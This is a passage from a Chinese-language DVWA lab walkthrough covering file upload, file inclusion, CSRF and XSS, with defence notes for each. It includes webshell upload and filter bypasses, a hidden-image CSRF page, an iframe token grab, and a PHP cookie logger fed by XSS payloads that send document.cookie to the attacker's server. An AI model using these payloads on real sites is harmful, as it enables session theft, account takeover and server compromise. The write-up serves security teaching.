class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) )</code>限制了上传类型只能为jpeg或png，同时文件大小不不能超过100000字节即1MB。</p>
<p>先把1.php后缀修改成png，然后使用burpsuite抓包修改文件后缀</p>
<p>抓包结果可以看到filename&#x3D;”1.png”，此时可以修改为“1.php”后forward</p>
<p><img data-src="/../images/DVWA/image-20220913153414883.png" alt="image-20220913153414883"></p>
<p>（send to repeater后修改然后GO也行）</p>
<p>发现上传成功。可以用中国蚁剑（Ant Sword）、中国菜刀（Cknife）连接，密码为设置的连接字符</p>
<p><img data-src="/../images/DVWA/image-20220913153736774.png" alt="image-20220913153736774"></p>
<p>或者修改type类型application&#x2F;x-php为 image&#x2F;jpeg也可以</p>
<p>在php&lt;5.3.4时，也可以使用00截断。</p>
<p>将文件名改成”1.php .png”，查看HEX，将16进制空格（20）改成（00）</p>
<p>或者将文件名改成”1.php%00.png”，抓包，选中filename进行Convert Selection—URL—url-decode</p>
<h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><p>查看源码发现加了一个getimagesize函数</p>
<blockquote>
<p>getimagesize()函数将测定任何GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM或WBMP图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通HTML文件中&lt; IMG &gt;标记中的 height&#x2F;width 文本字符串。</p>
</blockquote>
<p>此时可以将图片和一句话木马组合成一张图片上传</p>
<blockquote>
<p>linux文件合并</p>
<p>cat file1 file2 &gt; file3</p>
<p>windows文件合并</p>
<p>copy &#x2F;b file1 + &#x2F;a file2 file</p>
<p><a href="https://blog.csdn.net/JintGuo/article/details/77542490">copy</a> </p>
</blockquote>
<p>或者在文件头部加上<code>GIF89a</code>——如Medium</p>
<blockquote>
<p> 一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。</p>
<p>使用getimagesize函数无法判断其图片是无效的</p>
</blockquote>
<p>然后把合并后的文件上传，这里需要用到文件包含漏洞。（如果没有的话也是不能复现的）</p>
<p>这里在文件包含漏洞的界面+文件路径。会出现</p>
<p>Parse error：syntax error,unexpected ‘,’ ,expecting end of file in xx on line 11</p>
<blockquote>
<p>原因：Windows的文本默认是dos格式，换行符 CR LF。Linux的文本是unix格式，换行符 LF。另外，Mac系统下文本换行符为CR。</p>
<p>解决1：将dos格式转成unix格式，再执行脚本就不会报错了。</p>
<p>转换方式1：在windows中，notepad++编辑器右下角可直接修改文档格式</p>
<p>转换方式2：在Linux中，用vim打开脚本；用 :set ff 可查看文件格式；用 :set ff&#x3D;unix 可设置文件格式为unix：</p>
<p>原因2：shell脚本语法格式错误。</p>
</blockquote>
<p>换了个图片就可以了？</p>
<h1 id="7-文件包含漏洞（File-Inclusion）"><a href="#7-文件包含漏洞（File-Inclusion）" class="headerlink" title="7.文件包含漏洞（File Inclusion）"></a>7.文件包含漏洞（File Inclusion）</h1><h2 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h2><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含</p>
<p>服务器通过php的特性（函数的特性）去包含任意文件时，由于对包含的这个文件来源过滤不严，从而可去包含一个恶意的文件，来达到目的。</p>
<p>包括：本地文件包含和远程文件包含</p>
<p>原因：如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露。</p>
<p>函数：allow_url_fopen，allow_url_include开启（在phpstudy-&gt;其他选项菜单-&gt;php扩展及设置-&gt;参数设置，在这个里面可以打开与关闭函数）</p>
<p>PHP中文件包含函数有以下四种：</p>
<blockquote>
<p>require() # require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。 </p>
<p>require_once() # 功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次</p>
<p>include() # 当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含进来，发生错误时之给出一个警告，继续向下执行。</p>
<p>include_once() # 功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
</blockquote>
<h2 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h2><p>1.设置白名单</p>
<p>代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。</p>
<p>2.过滤危险字符：</p>
<p>由于<code>Include/Require</code>可以对<code>PHP Wrapper</code>形式的地址进行包含执行(需要配置<code>php.ini</code>)， 在Linux环境中可以通过”<code>../../</code>“的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。</p>
<p>3.设置文件目录(配置php.ini)：</p>
<p>PHP配置文件中有<code>open_basedir</code>选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。</p>
<p>4.关闭危险配置(配置php.ini)：</p>
<p>PHP配置中的<code>allow_url_include</code>选项如果打开，PHP会通过Include&#x2F;Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。</p>
<h2 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>尝试随便输个字符串，提示没有文件流，此时会显示路径（涂掉的那个）</p>
<p><img data-src="/../images/DVWA/image-20220914100304222.png" alt="image-20220914100304222"></p>
<p>选择之前上传的php（所以一般来说文件包含漏洞都得配合文件上传漏洞实现），使用绝对路径或相对路径</p>
<p>这里用get传参也会出现<code>failed to open stream</code>的提示，可以用HackBar来POST达到目的</p>
<p><img data-src="/../images/DVWA/image-20220914101919200.png" alt="image-20220914101919200"></p>
<p>远程文件包含</p>
<p>在显示路径的DVWA目录下有php.ini文件。</p>
<p>查看php.ini显示magic_quotes_gpc&#x3D;Off，allow_url_fopen&#x3D;on，allow_url_include&#x3D;on</p>
<p>当服务器的php配置中，当allow_url_fopen和allow_url_include打开时，服务器会允许包含远程服务器上的文件。在远程服务器上上传一个phpinfo.txt文件</p>
<h2 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2><p>查看源码，发现把”http” “https” “..&#x2F;“ “..\“转义为空</p>
<p>但是可以用双写或者大小写绕过</p>
<p><img data-src="/../images/DVWA/image-20220914102123146.png" alt="image-20220914102123146"></p>
<p>或者直接使用绝对地址（涂掉了）</p>
<p><img data-src="/../images/DVWA/image-20220914102251756.png" alt="image-20220914102251756"></p>
<h2 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h2><p>查看源码，使用fnmatch()函数对page参数进行过滤，要求page必须以“file”开头，服务器才会包含相应的文件。</p>
<p>把路径改成<code>file:///</code>的形式就可以了(绝对路径）</p>
<blockquote>
<p>file协议：本地文件传输协议，主要用于访问本地计算机中的文件。基本格式为：file:&#x2F;&#x2F;&#x2F;文件路径。</p>
</blockquote>
<p><img data-src="/../images/DVWA/image-20220914102438224.png" alt="image-20220914102438224"></p>
<h1 id="8-跨站请求伪造（CSRF"><a href="#8-跨站请求伪造（CSRF" class="headerlink" title="8.跨站请求伪造（CSRF)"></a>8.跨站请求伪造（CSRF)</h1><h2 id="介绍-6"><a href="#介绍-6" class="headerlink" title="介绍"></a>介绍</h2><p>CSRF：也叫XSRF（英文Cross-site request forgery），中文名是跨域请求伪造，也被称为One Click Attack或者Session Riding。CSRF是指恶意用户伪造并诱使用户A在不经意间点击这个链接，而在请求这个伪造的URL时，实际上是请求了某个需要用户A身份认证登录的服务。由于大部分登录服务都是通过Cookie来识别用户的，而这些Cookie存储在用户A登录过服务的浏览器上，只要不关闭浏览器不退出登录，以后访问这个服务就会带上这个Cookie直接登录 。</p>
<p>此漏洞就是利用保存在浏览器上的Cookie身份信息，不管以哪种方式请求对应的服务，都会自动读取Cookie免登录。尤其是在跨域情况下，虽然由于“跨域”无法用代码中的变量接收返回的内容（不管是Form表单的submit提交还是Ajax方式的提交），但如果不关心返回结果（不判断接口的请求结果是否成功），只是请求而已，此时就有可能在用户不知情的情况下修改了用户A对应的业务数据。</p>
<p>本质来说就是在访问网站信息的同时，盗用你的cookie，用你的身份进行一些非法操作。</p>
<h2 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h2><p>1、服务端使用Referer或Origin请求头判断请求来源，因为前端在发起请求时无法修改设置这两个请求头，只能是浏览器自动设置，参见：禁止修改的消息首部 - 术语表 | MDN。</p>
<p>说明：postman等模拟请求工具虽然可以修改Header头，但它只是模拟成了一个浏览器发起请求，实际浏览器并不能修改上述请求头。</p>
<p>2、保证某些请求参数必输，且这些参数不放在URL中，且这些参数不存储在浏览器可以重复读取利用的地方（比如Cookie中）。在这种情况下，必输参数只能放在Post参数中且该参数无法被恶意用户通过抓包等方式获取到，并且无法找到规律，请求时就会报缺少参数或参数错误无法访问服务。最常用的是使用身份令牌token：</p>
<p>这个token是与用户身份相关的随机数，且有有效期。每次请求都需要通过POST表单提交这个token，请求到服务端之后服务端要校验这个token值对不对。由于这个token没保存在Cookie中，只能通过Post参数传递，即使带上了Cookie中正确的身份信息，token缺失或者不正确都会直接被服务拒绝。这个token只有用户本身登录成功后才能拿到，别人无法伪造。</p>
<p>当然，如果用户自己从正确的请求页面中抓包拿到token，在一个新页面发请求，这种情况不考虑在内，毕竟这属于和用户密码泄露一样，并不能通过系统避免。</p>
<p>3、对于无Post必输参数的请求，单纯地增加Header头的Referer或Origin请求头校验，在“同域”下仍然不能避免诱使用户无感知点击链接，只能通过增加token的方式来解决。</p>
<p><a href="https://www.cnblogs.com/SmallVillageChief/p/15882469.html">CSRF攻击与防御</a></p>
<h2 id="Low-7"><a href="#Low-7" class="headerlink" title="Low"></a>Low</h2><p>输入修改后的密码然后抓包，发现这是一个get请求</p>
<p><img data-src="/../images/DVWA/image-20220914104426777.png" alt="image-20220914104426777"></p>
<p>可以将url+get请求拼接作为恶意链接；</p>
<p>或者使用burpsuite的Action&#x3D;Engagement tools&#x3D;Generate CSRF PoC&#x3D;Test in browser得到恶意链接</p>
<p>（当链接过长时可以使用工具生成短链）</p>
<p>可以诱使点击恶意链接或者构建一个网页如下</p>
<p>在真实情况下，这种方法需要事先在公网上上传一个攻击页面，诱导用户去访问这个页面，这样才能在用户不知情的情况下进行攻击</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;恶意链接&quot;</span> <span class="attr">border</span>=<span class="string">0</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found</span><br></pre></td></tr></table></figure>

<p>在虚拟机打开恶意链接成功修改密码？并没有，因为之前抓包没有丢弃。</p>
<p>在虚拟机直接打开恶意链接出现Submit Request字样？点击后修改密码成功</p>
<p>但是在主机使用burpsuite产生的链接未成功修改密码？</p>
<p>尝试用phpstudy新建一个网站，访问该网站仍然未成功，只能选择get链接。</p>
<p>然后发现浏览器阻止了跨源响应</p>
<p>直接打开文件可以修改，修改域名为127.0.0.1也可以。</p>
<p><img data-src="/../images/DVWA/image-20220914112207465.png" alt="image-20220914112207465"></p>
<p><strong>总结：需要保证DVWA地址和修改的HTML地址为统一IP段</strong></p>
<h2 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h2><p>抓包结果完全没变化<br>使用get链接，显示The request didn’t look correct<br>查看源码，<br>isset：判断变量是否声明<br>stripos：返回字符串在另一个字符串中第一次出现的位置（不区分大小写，后者为查找对象）</p>
<blockquote>
<p>相关函数：<br>strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）<br>strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）<br>strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p>
</blockquote>
<p>源码中检查了SERVER_NAME（Host）在HTTP_REFERER（Referer）中的位置（是否存在）<br>而对get链接抓包后显示是没有Referer的，在该包中添加Referer参数，但是还是提示错误。<br>发现他好像抽了，本身修改都不行。<br><strong>查看源代码发现SERVER_NAME是localhost</strong>。。。（无语了，修改phpstudy中域名为127）<br>然后发现可以正常修改了。（主机中）<br><strong>虚拟机也要改成127</strong>才行，成功修改<br>或者修改名称为IP.html放在该IP下也行（不同路径前缀不同）</p>
<h2 id="High-7"><a href="#High-7" class="headerlink" title="High"></a>High</h2><p>点击修改密码后抓包，发现相对之前</p>
<p>在GET请求后加了个user_token</p>
<p>在Referer中加了参数password_new，password_conf，change,user_token</p>
<p>（这里的password_new和password_conf是当前密码而非要修改的密码）</p>
<p><img data-src="/../images/DVWA/image-20220914112429188.png" alt="image-20220914112429188"></p>
<p>这里需要存储型XSS协助</p>
<p>在High等级的存储型XSS中可以爆出user_token</p>
<p>在Name栏输入<code>&lt;iframe src=&quot;../csrf&quot; onload=&quot;alert(frames[0].document.getElementByName(&#39;user_token&#39;)[0].value)&quot;&lt;/iframe&gt;</code>就能爆出来</p>
<p>但是这里跳转提示<code>Data too long for coloum &#39;name&#39; at row 1</code>？这里把数据库中name长度变长一点就行。<br>或者？</p>
<p>成功弹出token不要点击确定否则会被更新，把token放入构建的网址后用户访问就会被修改密码</p>
<h1 id="9-跨站脚本攻击（XSS）"><a href="#9-跨站脚本攻击（XSS）" class="headerlink" title="9.跨站脚本攻击（XSS）"></a>9.跨站脚本攻击（XSS）</h1><h2 id="介绍-7"><a href="#介绍-7" class="headerlink" title="介绍"></a>介绍</h2><p>XSS又叫CSS，跨站脚本攻击。它指的是恶意攻击者往web页面插入恶意的html代码。当用户浏览该页面时，嵌入到web里面的html代码会被运行，从而达到恶意攻击用户的特殊目的。（也是一种注入漏洞）</p>
<p>反射型XSS：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
<p>存储型XSS：&lt;持久化&gt; 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
<p>DOM型（在网页上，组织页面的对象被组织在一个树形结构中，用来表示文档中对象的标准模型就称为DOM，可能是存储型，也可能是反射型）XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p>
<h2 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h2><p>XSS防御的总体思路是：对用户的输入(和URL参数)进行过滤，对输出进行html编码。</p>
<p>对输入的内容进行过滤，可以分为黑名单过滤和白名单过滤。黑名单过滤虽然可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。白名单过滤虽然可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。</p>
<p>对输出进行html编码，就是通过函数，将用户的输入的数据进行html编码，使其不能作为脚本运行。</p>
<p>还可以在服务端设置会话Cookie的HTTP Only属性，许多 XSS 攻击的目的就是为了获取用户的 cookie，将重要的 cookie 标记为 http only，这样的话当浏览器向服务端发起请求时就会带上 cookie 字段，但是在脚本中却不能访问 cookie，这样就避免了 XSS 攻击利用 js 的 document.cookie获取 cookie。</p>
<h2 id="反射型XSS（Reflected-Cross-Site-Scripting）"><a href="#反射型XSS（Reflected-Cross-Site-Scripting）" class="headerlink" title="反射型XSS（Reflected Cross Site Scripting）"></a>反射型XSS（Reflected Cross Site Scripting）</h2><h3 id="Low-8"><a href="#Low-8" class="headerlink" title="Low"></a>Low</h3><p>查看源码，毫无举措</p>
<p>输入<code>&lt;script&gt;alert(&#39;123&#39;)&lt;/script&gt;</code>提交成功弹出提示框</p>
<p><img data-src="/../images/DVWA/image-20220914141657531.png" alt="image-20220914141657531"></p>
<p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>提交成功弹出cookie</p>
<p><img data-src="/../images/DVWA/image-20220914141730997.png" alt="image-20220914141730997"></p>
<p>那要如何把cookie发送到远程服务器呢？</p>
<p>在kali下打开apache服务 <code>/etc/init.d/apache2 start</code></p>
<p>打开端口映射，VMware下 编辑-虚拟网络编辑器-更改设置-NAT设置-添加</p>
<p>然后在kali &#x2F;var&#x2F;www&#x2F;html目录下写php脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span> (<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&quot;IP: &quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot;Date: &quot;</span>.<span class="variable">$time</span>.<span class="string">&quot; Cookie:&quot;</span>.<span class="variable">$cookie</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>保存后给脚本读写权限<code>chmod 666 php</code></p>
<p>然后新建cookie文件，将cookie文件权限提升并修改用户组为apache2的用户组。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询用户组，这里是www-data</span></span><br><span class="line"><span class="built_in">ps</span> aux | grep apache</span><br><span class="line"><span class="comment">#修改cookie用户组</span></span><br><span class="line">chown www<span class="literal">-data</span>:www<span class="literal">-data</span> cookie</span><br><span class="line"><span class="comment">#使用curl测试能否成功写入</span></span><br><span class="line"><span class="built_in">curl</span> <span class="number">192.168</span>.<span class="number">132.144</span>/cookie.php?cookie=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>然后就可以在xss界面通过下列获取cookie，查看cookie文件就行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">location.<span class="property">href</span>=<span class="string">&quot;http://服务器的IP/cookie.php?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>但是这种会跳转到空白界面</p>
<p>可以用ajax请求</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> http=<span class="keyword">new</span> <span class="title class_">XMLhttpRequest</span>();</span><br><span class="line">http.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://服务器的IP/cookie.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line">http.<span class="title function_">send</span>();</span><br><span class="line">http.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这种方法浏览器控制台会报错<code>no &#39;Access-Control-Allow-Orign&#39; header is present on the requested resource</code></p>
<p>可以用jquery</p>
<h3 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h3><p>查看源码可以发现，它将输入字符串的<code>&lt;script&gt;</code>替换成了空字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以使用大小写或双写绕过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCript</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;123&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;sc<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ript&gt;<span class="title function_">alert</span>(<span class="string">&#x27;123&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/DVWA/image-20220914142400524.png" alt="image-20220914142400524"></p>
<p>当符号被转义，可以使用字符实体</p>
<p><a href="https://www.w3school.com.cn/html/html_entities.asp">字符实体</a></p>
<p>html实体编码(10进制与16进制)</p>
<p>javascript的八进制跟十六进制</p>
<p>js unicode编码</p>
<p>url编码 base64编码</p>
<p><a href="https://zhuanlan.kanxue.com/article-13338.htm">转义绕过</a></p>
<p>当<code>&lt;script&gt;</code>标签被转义，可以使用onload 关键字和onerror 事件</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果onload事件在代码之前已经被处理了。那就不会触发了</span></span><br><span class="line">&lt;body onload=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><br><span class="line"><span class="comment">//图片没有指定，也就是出错了,Onerror 这个事件就会发生</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><code>&lt;input&gt;</code>标签属性绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; value=&#x27;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>闭合<code>&lt;input&gt;</code></p>
<p><code>&#39;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
<p>此时界面会多出单引号，可以变成</p>
<p><code>&#39;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;xss a=&#39;</code></p>
<p><code>&lt;xss a=”&gt;</code>这个没有意义，不会执行</p>
<h3 id="High-8"><a href="#High-8" class="headerlink" title="High"></a>High</h3><p>查看源码，发现它把<code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code>转义成空字符</p>
<p>preg_replace() 函数执行一个正则表达式的搜索和替换。</p>
<p><a href="https://www.runoob.com/regexp/regexp-metachar.html">正则表达式</a></p>
<p>该串字符的含义是<code>//</code>之间的字符<code>&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t</code>不区分大小写（ignore），限制了大小写绕过</p>
<blockquote>
<p>i ignore - 不区分大小写	将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</p>
<p>g global - 全局匹配 	查找所有的匹配项。</p>
<p>m multi line - 多行匹配	使边界字符 ^ 和 $ 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</p>
<p>s <code>特殊字符圆点.中包含换行符\n</code>	默认情况下的圆点.是匹配除换行符 \n 之外的任何字符，加上 s 修饰符之后, . 中包含换行符 \n。</p>
</blockquote>
<p><code>.</code>匹配除换行符（\n、\r）之外的任何单个字符。</p>
<p><code>*</code>匹配前面的子表达式零次或多次</p>
<p>即<code>(.*)</code>限制了双写绕过</p>
<p>也就是说<code>&lt;script&gt;</code>已经寄了</p>
<p>但是可以使用onload和onerror</p>
<p><img data-src="/../images/DVWA/image-20220914142435022.png" alt="image-20220914142435022"></p>
<h2 id="存储型XSS（Stored）"><a href="#存储型XSS（Stored）" class="headerlink" title="存储型XSS（Stored）"></a>存储型XSS（Stored）</h2><p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。反射型XSS的被攻击对象一般是攻击者去寻找的，就比如说：一个攻击者想盗取A的账号，那么攻击者就可以将一个含有反射型XSS的特制URL链接发送给A，然后用花言巧语诱骗A点击链接。当A不小心点进去时，就会立即受到XSS攻击。这种攻击方式需要一点骗术，所以这种攻击范围不是特别的广，并且提交漏洞时要么平台不认，要么会被认定为低危漏洞。</p>
<p>存储型XSS可以采用广撒网的方式，就是攻击者将存储型XSS代码写进一些有XSS漏洞的网站上，只要有用户访问这个链接就会自动中招。所以我们可以看出，存储型XSS的危害性更大，范围更广，可以不需要寻找被攻击对象，只要存储型XSS在服务器上就能实施攻击。所以提交的存储型XSS评级一般为中危漏洞。</p>
<p>这种攻击多见于论坛、博客和留言板。攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端数据库中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到触发。</p>
<h3 id="Low-9"><a href="#Low-9" class="headerlink" title="Low"></a>Low</h3><p>正常输入Name，在Message栏输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>此时会弹出提示框，刷新界面依然会弹出，说明成功注入存储型XSS</p>
<p>F12查看元素，发现该输入框限制了最大长度，直接修改就行</p>
<p><img data-src="/../images/DVWA/image-20220914142527687.png" alt="image-20220914142527687"></p>
<p>同样，使用反射型XSS中传递cookie的js在每次访问界面的时候也能传递</p>
<p>（这里要离开界面再访问刷新，不然每次刷新会多一个Message）</p>
<h3 id="Medium-9"><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h3><p>查看源码，发现它把Name里的<code>&lt;script&gt;</code>替换为空</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> ); </span><br></pre></td></tr></table></figure>

<p>对Message使用了<code>strip_tags(addslashes($message))</code>，其中</p>
<blockquote>
